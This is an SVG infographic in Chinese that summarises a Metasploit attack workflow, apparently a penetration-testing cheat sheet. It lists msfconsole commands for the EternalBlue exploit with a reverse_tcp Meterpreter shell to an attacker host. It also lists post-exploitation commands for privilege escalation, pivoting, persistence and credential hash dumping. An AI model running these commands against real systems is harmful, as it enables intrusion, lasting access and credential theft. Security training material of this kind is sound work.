<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 500" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="500" fill="#f8fafc"/>
  <defs>
    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#c53030"/>
    </marker>
  </defs>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">Metasploit Framework 攻击流程</text>

  <rect x="40" y="60" width="140" height="50" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="110" y="92" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">① 信息收集</text>

  <line x1="180" y1="85" x2="215" y2="85" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="220" y="60" width="140" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="290" y="92" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">② 选择 EXP</text>

  <line x1="360" y1="85" x2="395" y2="85" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="400" y="60" width="140" height="50" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="470" y="92" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">③ 配置参数</text>

  <line x1="540" y1="85" x2="575" y2="85" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="580" y="60" width="140" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="650" y="92" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">④ 执行攻击</text>

  <line x1="720" y1="85" x2="755" y2="85" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="760" y="60" width="140" height="50" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="830" y="92" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">⑤ 获取会话</text>

  <line x1="900" y1="85" x2="935" y2="85" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="940" y="60" width="20" height="50" rx="8" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>

  <rect x="40" y="140" width="460" height="330" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">msfconsole 实战</text>

  <text x="70" y="195" font-size="10" font-weight="bold" fill="#c53030">启动：</text>
  <text x="70" y="215" font-size="9" fill="#2d3748">msfconsole</text>
  <text x="70" y="235" font-size="9" fill="#2d3748">msfconsole -q（无广告）</text>

  <text x="70" y="265" font-size="10" font-weight="bold" fill="#805ad5">搜索漏洞：</text>
  <text x="70" y="285" font-size="9" fill="#2d3748">search tomcat</text>
  <text x="70" y="305" font-size="9" fill="#2d3748">search ms17-010</text>

  <text x="70" y="335" font-size="10" font-weight="bold" fill="#dd6b20">选择 EXP：</text>
  <text x="70" y="355" font-size="9" fill="#2d3748">use exploit/windows/smb/ms17_010_eternalblue</text>

  <text x="70" y="385" font-size="10" font-weight="bold" fill="#3182ce">配置：</text>
  <text x="70" y="405" font-size="9" fill="#2d3748">set RHOSTS 192.168.1.100</text>
  <text x="70" y="425" font-size="9" fill="#2d3748">set PAYLOAD windows/meterpreter/reverse_tcp</text>
  <text x="70" y="445" font-size="9" fill="#2d3748">set LHOST 10.0.0.1</text>

  <text x="70" y="470" font-size="10" font-weight="bold" fill="#38a169">执行：</text>
  <text x="70" y="475" font-size="9" fill="#2d3748">exploit · run · sessions -l</text>

  <rect x="520" y="140" width="440" height="330" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">Meterpreter 常用命令</text>

  <text x="550" y="195" font-size="10" font-weight="bold" fill="#c53030">系统信息：</text>
  <text x="550" y="215" font-size="9" fill="#2d3748">sysinfo · getuid · getsystem</text>
  <text x="550" y="235" font-size="9" fill="#2d3748">getprivs · getsystem</text>

  <text x="550" y="265" font-size="10" font-weight="bold" fill="#805ad5">文件操作：</text>
  <text x="550" y="285" font-size="9" fill="#2d3748">upload · download · cat · edit</text>

  <text x="550" y="315" font-size="10" font-weight="bold" fill="#dd6b20">网络操作：</text>
  <text x="550" y="335" font-size="9" fill="#2d3748">portfwd add -l 8080 -p 80</text>
  <text x="550" y="355" font-size="9" fill="#2d3748">run autoroute -s 192.168.1.0/24</text>

  <text x="550" y="385" font-size="10" font-weight="bold" fill="#3182ce">权限维持：</text>
  <text x="550" y="405" font-size="9" fill="#2d3748">run persistence -U -i 5 -p 4444</text>

  <text x="550" y="435" font-size="10" font-weight="bold" fill="#38a169">凭证收集：</text>
  <text x="550" y="455" font-size="9" fill="#2d3748">run post/windows/gather/smart_hashdump</text>
  <text x="550" y="475" font-size="9" fill="#2d3748">run post/windows/credentials/collected</text>
</svg>
